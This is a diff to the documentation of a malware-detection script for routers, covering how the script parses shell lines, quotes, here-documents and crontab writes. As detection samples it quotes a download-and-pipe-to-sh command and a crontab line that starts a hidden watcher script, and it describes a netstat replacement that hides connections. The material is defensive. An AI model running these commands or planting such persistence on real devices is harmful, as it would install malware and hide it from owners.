@@ -117,11 +117,11 @@ This script also detects:
 
     Tool and server count together only within one command: a comment, `||`, `;`, `&&` or
     `&` in between separates them. A line that ends in `\` goes on in the next, as in
-    `sh`: not when the `\` ends a comment, not after `\\`, and never in a crontab or a
-    keep list, which are read line by line. Quotes on one line are read as `sh` reads them
-    (since 2.54): a `;`, `&`, `|` or `#` inside a quoted string, as in
-    `wget -qO- "http://…/ni.sh?id=1&arch=arm" | sh`, neither separates nor starts a
-    comment, unless the string is a command itself (after `sh -c`, `su -c`, `eval`,
+    `sh`, also in the text of a here-document: not when the `\` ends a comment, not after
+    `\\`, and never in a crontab or a keep list, which are read line by line. Quotes on
+    one line are read as `sh` reads them (since 2.54): a `;`, `&`, `|` or `#` inside a
+    quoted string, as in `wget -qO- "http://…/ni.sh?id=1&arch=arm" | sh`, neither
+    separates nor starts a comment, unless the string is a command itself (after `sh -c`, `su -c`, `eval`,
     `trap`, `watch`, `ssh`, `xargs` and the like). Such a line is read plainly as well, as
     in 2.53, so that a quote `sh` reads otherwise hides nothing. Only the plain reading is
     used for a quote that does not close on its line, for `$(` or a backquote inside
@@ -148,7 +148,9 @@ This script also detects:
   `rc.local` and the root crontab. What `echo` or `printf` writes into a crontab,
   `rc.local` or another file that starts programs, or pipes into `crontab -`, is read as a
   command too: `echo "*/3 * * * * /etc/config/.gl/watch.sh" >> /etc/crontabs/root` starts
-  the malware (since 2.54). A keep list counts when it keeps a path of the malware.
+  the malware (since 2.54); a text that starts with a directory, as in
+  `echo "/etc/config/.gl/ found"`, starts nothing. A keep list counts when it keeps a
+  path of the malware.
   - the replaced `netstat`: a two-line script that calls the real one and hides the
     connections to its server.
   - the malware's program or its downloader under any name: `gl-helper` and the downloader
